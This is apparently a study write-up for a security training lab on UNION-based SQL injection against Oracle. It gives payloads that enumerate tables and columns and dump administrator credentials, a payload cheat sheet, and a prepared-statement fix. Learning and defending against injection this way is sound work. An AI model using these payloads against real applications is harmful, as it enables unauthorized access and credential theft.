# 🧪 Lab: SQL Injection – Listing Database Contents (Oracle)

## 🎯 Goal

* Find **users table**
* Extract **username & password columns**
* Dump credentials
* Login as **administrator**

---

## 🧠 Concept

**UNION-based SQL Injection (Oracle specific)**

* Combine original query + attacker query
* Conditions:

  * Same number of columns
  * Compatible data types

---

## 🔍 Exploitation Steps

---

### 1️⃣ Find Number of Columns

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

✔️ Stop when error appears (e.g., 2 columns)

---

### 2️⃣ Find Reflected Columns

```sql
' UNION SELECT 'test','test' FROM dual--
```

✔️ Oracle me `FROM dual` required hota hai

---

### 3️⃣ Extract Table Names

```sql
' UNION SELECT table_name, NULL FROM all_tables--
```

✔️ Important table:

```
USERS_xxxxxx
```

---

### 4️⃣ Extract Column Names

```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_xxxxxx'--
```

✔️ Found:

```
USERNAME_xxxxxx
PASSWORD_xxxxxx
```

---

### 5️⃣ Dump Credentials

```sql
' UNION SELECT USERNAME_xxxxxx, PASSWORD_xxxxxx FROM USERS_xxxxxx--
```

✔️ Output:

```
administrator : <password>
```

---

### 6️⃣ Login as Admin

* Use extracted credentials
* ✅ Lab solved

---

## ⚡ Key Learnings

### 🔑 Oracle System Tables

* `all_tables` → table names
* `all_tab_columns` → column names

---

### 🔑 Case Sensitivity

```sql
WHERE table_name='USERS_xxxxxx'
```

✔️ Must be **UPPERCASE**

---

### 🔑 DUAL Table

```sql
SELECT 'test' FROM dual
```

✔️ Oracle specific dummy table

---

### 🔑 String Concatenation

```sql
username || ':' || password
```

---

## 🛡️ Prevention

### ❌ Vulnerable Code

```php
$query = "SELECT * FROM products WHERE category = '$input'";
```

### ✅ Secure Code

```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category = ?");
$stmt->execute([$input]);
```

---

## 🧠 Payload Cheat Sheet (Oracle)

```sql
-- Tables
' UNION SELECT table_name, NULL FROM all_tables--

-- Columns
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_xxx'--

-- Dump data
' UNION SELECT USERNAME_xxx, PASSWORD_xxx FROM USERS_xxx--

-- Test output
' UNION SELECT 'test','test' FROM dual--
```

---

## 🔥 Interview Line

"Used UNION-based SQL injection on Oracle DB, enumerated tables via all_tables, extracted columns via all_tab_columns, and dumped admin credentials."
